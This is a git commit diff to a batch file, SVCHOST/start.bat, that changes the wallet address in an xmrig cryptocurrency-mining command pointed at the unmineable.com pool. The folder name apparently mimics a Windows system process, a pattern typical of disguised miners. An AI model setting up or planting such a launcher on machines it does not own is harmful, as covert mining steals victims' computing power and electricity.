ae65cbd67cdd4b0d60b19dfce15560d3a5d1ab21
Joshua Daniel <85048311+joshuadaniel-8090@users.noreply.github.com>
2024-03-18 22:11:55 +0530

    updated meta data with referral

--- SVCHOST/start.bat
+++ SVCHOST/start.bat
@@ -1,2 +1,2 @@
-xmrig.exe -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u kaspa:qz0klen638wcmyxpfv6jyfvpfjmuzfunj2k3hgm3qyvjp9c74ae4z4grcvlf3.test_josh#h2rv-53k6 -p x
+xmrig.exe -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u kaspa:qqqsapk0rt9uxt2plrnehw0hrdkzyy8jknvm6hlyu06rys5dgj757ydk6qav7.test_josh#zs5p-y7uy -p x
 pause 
